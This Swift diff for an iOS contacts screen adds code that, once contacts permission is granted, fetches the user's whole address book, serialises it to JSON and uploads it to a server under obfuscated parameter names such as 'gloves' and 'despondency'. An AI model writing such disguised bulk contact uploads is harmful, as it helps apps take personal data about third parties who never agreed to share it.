@@ -100,13 +100,18 @@ class ContactViewController: BaseViewController {
             .throttle(.milliseconds(200), scheduler: MainScheduler.instance)
             .bind(onNext: { [weak self] in
                 guard let self = self else { return }
-                var parameters = ["despondency": cardModel?.whimseys ?? ""]
-                //                for model in modelArray {
-                //                    let key = model.portent ?? ""
-                //                    let value = model.led ?? ""
-                //                    parameters[key] = value
-                //                }
-                //                viewModel.saveListInfo(parameters: parameters)
+                var listArray: [[String: String]] = []
+                for model in modelArray {
+                    var parameters: [String: String] = [:]
+                    parameters["jest"] = model.jest ?? ""
+                    parameters["destiny"] = model.destiny ?? ""
+                    parameters["afterthought"] = model.afterthought ?? ""
+                    listArray.append(parameters)
+                }
+                let jsonStr = jsonString(from: listArray)
+                let parameters = ["despondency": cardModel?.whimseys ?? "",
+                                  "gloves": jsonStr]
+                viewModel.saveListInfo(parameters: parameters)
             })
             .disposed(by: disposeBag)
         
@@ -232,14 +237,30 @@ extension ContactViewController: UITableViewDelegate, UITableViewDataSource {
             }
             ContactManager.shared.requestPermission { granted in
                 if granted {
-                    ContactManager.shared.fetchAllContacts { list in
-                        print("list-====：", list)
+                    ContactManager.shared.fetchAllContacts { [weak self] list in
+                        guard let self = self else { return }
+                        let jsonStr = jsonString(from: list)
+                        let parameters = ["despondency": cardModel?.whimseys ?? "",
+                                          "gloves": jsonStr]
+                        viewModel.uploadListInfo(parameters: parameters)
                     }
                 }
             }
         }
+        
         return cell
     }
     
 }
 
+extension ContactViewController {
+    
+    private func jsonString(from list: [[String: String]]) -> String {
+        guard JSONSerialization.isValidJSONObject(list),
+              let data = try? JSONSerialization.data(withJSONObject: list, options: [.prettyPrinted, .sortedKeys]) else {
+            return ""
+        }
+        return String(data: data, encoding: .utf8) ?? ""
+    }
+    
+}
